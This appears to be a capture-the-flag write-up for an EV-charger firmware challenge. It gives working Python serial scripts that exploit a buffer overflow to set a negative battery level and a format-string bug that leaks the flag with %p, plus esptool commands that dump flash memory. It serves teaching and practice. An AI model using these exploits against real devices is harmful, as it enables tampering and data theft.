# Vulnerability #1 Buffer Overflow

The message customization menu contains a buffer overflow. The variable itself has 20 bytes.

```c
#define MAX_INPUT_LEN 128

int batteryLevel = 100;
uint8_t message[20] = "EV Charger 0.12\0";
```

When we select menu 1, we call `readInput` with `message`.

```c
void handleMenuSelection() {
  switch (menuOption) {
	case 1:
      readInput(message);
```	  

And `readInput` will read up to `MAX_INPUT_LEN` characters.

```c
int readInput(uint8_t *buf) {
  Serial.print("Enter (# to finish): ");
  int i=0;
  while(i<MAX_INPUT_LEN-1) {
```

Therefore, we will overflow after the 20th character. 
The overflow will occur in the variable just above, which happens to be `batteryLevel` (and more).
We wish to modify the battery level to a negative value, so we need to write precisely 20 characters and then 4 bytes for batteryLevel: `\xf6\xff\xff\xff` is -10 for example.


```python
import serial
import time
s = serial.Serial("/dev/ttyACM0",baudrate=115200, timeout=0.2)


s.write(b"\n")
print(s.read_until(b"Select an option:"))
s.write(b"1")
time.sleep(1)
print(s.read_until(b":"))
s.write(b"A"*20+b"\xf6\xff\xff\xff"+b"#")
time.sleep(1)
print(s.read_all())
```

# Vulnerability #2 Format String

The message customization also has a format string vulnerability!
Indeed, `readInput` will accept any character (apart `#` which terminates the string), and we display the message without any prior check at `updateBatteryDisplay()`:

```c
M5.Display.printf((const char*)message); 
```

Consequently, we can input format strings such as `%p`, `%x`, `%s` etc to read variables.
You'll find out that using 8 `%p` displays the flag.

```python
import serial
import time

s = serial.Serial("/dev/ttyACM0",baudrate=115200, timeout=0.2)
s.write(b"\n")
print(s.read_until(b"Select an option:"))
s.write(b"1")
time.sleep(1)
print(s.read_until(b":"))
sent = b'A '+ b'%p '*8 +b'#'
s.write(sent)
time.sleep(1)
received = s.read_all()
print(received)
```

Result: 
```
b' A %p %p %p %p %p %p %p %p \r\nA 0x0 0x7f 0x3ffc2c50 0x3ffb21ec 0xd2083 0x5 0x3ffc256c 0x3ffc25b4 \nStatus: Charges=0 Battery=622882853%\nph0wn{0rganiZers_are_talenT3D}\nMenu:\r\n1. Custom message\r\n2. Admin\r\nSelect an option: '
```

# Vulnerability #3: unprotected memory dump

The strings in the firmware are not protected. If we dump the firmware and search for strings, we find the flag.

```
$ esptool.py -b 921600 --port /dev/ttyACM0 read_flash 0x00000 0x400000 flash_4M.bin
$ strings flash_4M.bin | grep ph0wn
```

A possible solution is to encrypt the flag in the firmware and decrypt it when it needs to be displayed. Then, the firmware would need to be reversed to (1) understand the encryption algorithm, (2) pick up the decryption key and (3) decrypt the encrypted flag.
